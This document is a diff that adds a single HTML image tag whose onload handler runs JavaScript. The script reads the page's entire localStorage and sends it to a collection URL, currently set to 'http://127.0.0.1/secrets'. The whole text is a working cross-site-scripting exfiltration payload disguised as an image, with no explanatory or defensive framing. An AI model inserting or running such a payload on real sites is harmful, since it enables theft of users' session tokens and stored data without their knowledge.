@@ -1,0 +1,7 @@
+<img src="https://jaydata.org/wp-content/uploads/2016/09/html5-localstorage-2.png" onload="javascript:
+    var url = 'http://127.0.0.1/secrets';
+    var payload = '?localStorage=' + JSON.stringify(localStorage);
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open('GET', url + payload, true);
+    xmlHttp.send();
+"/>
